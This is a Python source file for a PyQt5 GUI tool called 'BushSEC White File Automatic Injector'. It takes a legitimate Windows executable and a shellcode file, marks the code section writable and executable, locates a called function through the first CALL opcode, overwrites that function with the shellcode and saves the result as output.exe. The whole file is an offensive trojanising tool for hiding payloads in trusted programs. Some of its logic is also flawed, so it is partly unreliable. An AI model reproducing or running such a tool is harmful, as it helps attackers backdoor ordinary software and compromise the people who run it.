# -*- coding: utf-8 -*-
import sys
import pefile
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QPushButton, QLineEdit, QFileDialog, QLabel, QHBoxLayout, QMessageBox
from PyQt5.QtGui import QIcon, QFont, QColor, QPalette
from PyQt5.QtCore import Qt, QPropertyAnimation

# Convert file offset to RVA
def get_rva_from_offset(pe, offset):
    for section in pe.sections:
        if section.contains_offset(offset):
            return offset - section.PointerToRawData + section.VirtualAddress
    return None

# Convert RVA to file offset
def get_offset_from_rva(pe, rva):
    for section in pe.sections:
        if section.contains_rva(rva):
            return rva - section.VirtualAddress + section.PointerToRawData
    return None

# Get main function offset (search within .text section)
def get_main_offset(data, is_32bit, text_section_start, text_section_size):
    # Use direct CALL pattern for both 32-bit and 64-bit
    pattern = bytes.fromhex("E8")  # Direct CALL instruction with relative offset
    
    print(f"Searching pattern: {' '.join(f'{x:02X}' for x in pattern)} in .text section (offset {text_section_start} - {text_section_start + text_section_size})")
    
    # Restrict search to .text section
    text_section_data = data[text_section_start:text_section_start + text_section_size]
    offset_in_section = text_section_data.find(pattern)
    
    if offset_in_section == -1:
        print("No matching pattern found in .text section!")
        return 0
    
    # Convert to file offset
    offset = text_section_start + offset_in_section
    print(f"Pattern found at offset: {offset}")
    
    # Validate offset
    if offset + 5 > len(data):
        print("Offset exceeds file size!")
        return 0
    
    return offset

# Modify relocation table
def modify_relocation_entries(pe, old_rva, new_rva):
    if hasattr(pe, 'DIRECTORY_ENTRY_BASERELOC'):
        for reloc in pe.DIRECTORY_ENTRY_BASERELOC:
            for entry in reloc.entries:
                if entry.rva >= old_rva and entry.rva < old_rva + (new_rva - old_rva):
                    entry.rva += (new_rva - old_rva)

# PE file patching function
def patch_pe(pe_file_path, shellcode_path):
    try:
        # Read shellcode
        with open(shellcode_path, 'rb') as f:
            shellcode = f.read()
        shellcode_size = len(shellcode)
        print(f"Shellcode size: {shellcode_size} bytes")

        # Load PE file
        pe = pefile.PE(pe_file_path)
        
        # Find .text section
        target_section = None
        for section in pe.sections:
            if section.Name.decode().rstrip('\x00') == '.text':
                target_section = section
                break
        
        if not target_section:
            raise Exception("No suitable section found for injection")

        # Check if there's enough space
        if target_section.SizeOfRawData < shellcode_size:
            print(f"Original section size {target_section.SizeOfRawData} insufficient, expanding...")
            pe.sections[pe.sections.index(target_section)].SizeOfRawData = shellcode_size + 0x1000
            pe.sections[pe.sections.index(target_section)].Misc_VirtualSize = shellcode_size + 0x1000

        # Update section characteristics
        target_section.Characteristics |= (pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE'] | 
                                         pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'])
        section_name = target_section.Name.decode().rstrip('\x00')
        print(f"Updated characteristics of section {section_name}")

        # Read original PE data
        with open(pe_file_path, 'rb') as f:
            data = bytearray(f.read())

        # Determine injection point
        is_32bit = pe.FILE_HEADER.Machine == pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_I386']
        print(f"Target file type: {'32-bit' if is_32bit else '64-bit'}")
        
        # Pass .text section boundaries to get_main_offset
        text_section_start = target_section.PointerToRawData
        text_section_size = target_section.SizeOfRawData
        call_main_offset = get_main_offset(data, is_32bit, text_section_start, text_section_size)
        
        if call_main_offset == 0:
            print("Unable to find main entry pattern!")
            return False

        print(f"Call main offset: {call_main_offset}")
        call_main_rva = get_rva_from_offset(pe, call_main_offset)
        if not call_main_rva:
            print(f"Invalid RVA calculation for offset {call_main_offset}!")
            for section in pe.sections:
                section_name = section.Name.decode().rstrip('\x00')
                print(f"Section {section_name}: Offset {section.PointerToRawData} - {section.PointerToRawData + section.SizeOfRawData}")
            return False

        # Debug relative offset
        relative_offset = int.from_bytes(data[call_main_offset + 1: call_main_offset + 5], 'little', signed=True)
        print(f"Relative offset: {relative_offset}")
        main_rva = call_main_rva + relative_offset + 5
        print(f"Calculated main_rva: 0x{main_rva:X}")
        main_offset = get_offset_from_rva(pe, main_rva)

        if not main_offset:
            print("Invalid main function offset calculation!")
            # Debug: Print all section RVAs
            for section in pe.sections:
                section_name = section.Name.decode().rstrip('\x00')
                print(f"Section {section_name}: RVA {section.VirtualAddress} - {section.VirtualAddress + section.Misc_VirtualSize}")
            return False

        print(f"Main RVA: 0x{main_rva:X}, Main offset: 0x{main_offset:X}")

        # Modify relocation table
        modify_relocation_entries(pe, main_rva, main_rva)

        # Write shellcode
        output_file_path = 'output.exe'
        data[main_offset:main_offset + shellcode_size] = shellcode
        print("Shellcode written")

        # Update PE header checksum
        pe.OPTIONAL_HEADER.CheckSum = pe.generate_checksum()

        # Save modified PE file
        with open(output_file_path, 'wb') as f:
            f.write(bytes(data))
        
        print(f"Patched PE file saved as: {output_file_path}")
        return True

    except Exception as e:
        print(f"Error during patching: {str(e)}")
        return False

# UI class
class PEInjector(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()
        # Set window icon
        self.setWindowIcon(QIcon(r'E:\Desktop\C Code\BushSEC PE injector\111.ico'))

    def init_ui(self):
        self.setWindowTitle('BushSEC White File Automatic Injector')
        self.setGeometry(100, 100, 500, 300)

        # Set dark mode and transparency effect
        self.setAutoFillBackground(True)
        palette = self.palette()
        palette.setColor(QPalette.Window, QColor(0, 0, 0, 200))
        palette.setColor(QPalette.WindowText, Qt.white)
        palette.setColor(QPalette.Base, QColor(25, 25, 25))
        palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
        palette.setColor(QPalette.ToolTipBase, Qt.white)
        palette.setColor(QPalette.ToolTipText, Qt.white)
        palette.setColor(QPalette.Text, Qt.white)
        palette.setColor(QPalette.Button, QColor(0, 0, 0))
        palette.setColor(QPalette.ButtonText, Qt.white)
        palette.setColor(QPalette.BrightText, Qt.red)
        palette.setColor(QPalette.Link, QColor(42, 130, 218))
        palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
        palette.setColor(QPalette.HighlightedText, Qt.black)
        self.setPalette(palette)

        layout = QVBoxLayout()

        title_label = QLabel('BushSEC PE Injector')
        title_label.setFont(QFont('Arial', 16, QFont.Bold))
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("background-color: black; color: white;")
        layout.addWidget(title_label)

        self.pe_file_label = QLabel('Enter or select PE file:')
        self.pe_file_label.setFont(QFont('Arial', 12))
        self.pe_file_label.setStyleSheet("color: white;")
        layout.addWidget(self.pe_file_label)

        pe_file_layout = QHBoxLayout()
        self.pe_file_input = QLineEdit()
        self.pe_file_input.setFont(QFont('Arial', 10))
        self.pe_file_input.setStyleSheet("background-color: black; color: white; border: 1px solid gray; border-radius: 5px; padding: 5px;")
        pe_file_layout.addWidget(self.pe_file_input)

        self.select_pe_button = QPushButton('Select PE File')
        self.select_pe_button.setFont(QFont('Arial', 10))
        self.select_pe_button.setStyleSheet("""
            QPushButton {
                background-color: black; 
                color: white; 
                border: 1px solid gray;
                border-radius: 5px;
                padding: 5px;
                box-shadow: 2px 2px 5px #888888;
            }
            QPushButton:pressed {
                background-color: black; 
                color: white; 
                border: 1px solid gray;
                border-radius: 5px;
                padding: 5px;
                box-shadow: inset 2px 2px 5px #888888;
            }
            QPushButton:hover {
                background-color: #1E90FF;
            }
        """)
        self.select_pe_button.clicked.connect(self.select_pe_file)
        pe_file_layout.addWidget(self.select_pe_button)
        layout.addLayout(pe_file_layout)

        self.shellcode_file_label = QLabel('Enter or select Shellcode file:')
        self.shellcode_file_label.setFont(QFont('Arial', 12))
        self.shellcode_file_label.setStyleSheet("color: white;")
        layout.addWidget(self.shellcode_file_label)

        shellcode_file_layout = QHBoxLayout()
        self.shellcode_file_input = QLineEdit()
        self.shellcode_file_input.setFont(QFont('Arial', 10))
        self.shellcode_file_input.setStyleSheet("background-color: black; color: white; border: 1px solid gray; border-radius: 5px; padding: 5px;")
        shellcode_file_layout.addWidget(self.shellcode_file_input)

        self.select_shellcode_button = QPushButton('Select Shellcode File')
        self.select_shellcode_button.setFont(QFont('Arial', 10))
        self.select_shellcode_button.setStyleSheet("""
            QPushButton {
                background-color: black; 
                color: white; 
                border: 1px solid gray;
                border-radius: 5px;
                padding: 5px;
                box-shadow: 2px 2px 5px #888888;
            }
            QPushButton:pressed {
                background-color: black; 
                color: white; 
                border: 1px solid gray;
                border-radius: 5px;
                padding: 5px;
                box-shadow: inset 2px 2px 5px #888888;
            }
            QPushButton:hover {
                background-color: #1E90FF;
            }
        """)
        self.select_shellcode_button.clicked.connect(self.select_shellcode_file)
        shellcode_file_layout.addWidget(self.select_shellcode_button)
        layout.addLayout(shellcode_file_layout)

        self.patch_button = QPushButton('Patch PE File')
        self.patch_button.setFont(QFont('Arial', 12))
        self.patch_button.setStyleSheet("""
            QPushButton {
                background-color: black; 
                color: white; 
                border: 1px solid gray;
                border-radius: 5px;
                padding: 5px;
                box-shadow: 2px 2px 5px #888888;
            }
            QPushButton:pressed {
                background-color: black; 
                color: white; 
                border: 1px solid gray;
                border-radius: 5px;
                padding: 5px;
                box-shadow: inset 2px 2px 5px #888888;
            }
            QPushButton:hover {
                background-color: #1E90FF;
            }
        """)
        self.patch_button.clicked.connect(self.patch_pe_file)
        layout.addWidget(self.patch_button)

        self.setLayout(layout)

        # Add animation effect
        self.add_animations()

    def add_animations(self):
        self.animation = QPropertyAnimation(self, b"windowOpacity")
        self.animation.setDuration(1000)
        self.animation.setStartValue(0)
        self.animation.setEndValue(1)
        self.animation.start()

    def select_pe_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, 'Open PE File', '', 'Executable Files (*.exe)')
        if file_name:
            self.pe_file_input.setText(file_name)
            self.pe_file_path = file_name

    def select_shellcode_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, 'Open Shellcode File', '', 'Binary Files (*.bin)')
        if file_name:
            self.shellcode_file_input.setText(file_name)
            self.shellcode_file_path = file_name

    def patch_pe_file(self):
        if hasattr(self, 'pe_file_path') and hasattr(self, 'shellcode_file_path'):
            success = patch_pe(self.pe_file_path, self.shellcode_file_path)
            if success:
                QMessageBox.information(self, 'Success', 'PE file patched successfully!')
            else:
                QMessageBox.critical(self, 'Error', 'Failed to patch PE file. Check console output for details.')
        else:
            QMessageBox.warning(self, 'Error', 'Please select both PE file and Shellcode file.')

if __name__ == '__main__':
    app = QApplication(sys.argv)
    injector = PEInjector()
    injector.show()
    sys.exit(app.exec_())
